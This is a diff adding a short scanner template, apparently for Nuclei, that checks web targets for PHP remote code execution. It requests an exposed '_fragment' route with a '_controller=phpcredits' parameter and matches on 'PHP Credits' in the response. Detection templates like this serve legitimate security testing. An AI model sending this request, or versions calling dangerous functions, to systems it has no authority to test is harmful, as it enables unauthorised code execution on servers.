@@ -1,0 +1,23 @@
+id: rce-php
+
+info:
+  name: php rce
+  author: ELSFA7110
+  severity: high
+  tags: rce
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/_fragment?_path=_controller=phpcredits&flag=-1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "PHP Credits"
+        part: body
+
+      - type: status
+        status:
+          - 200
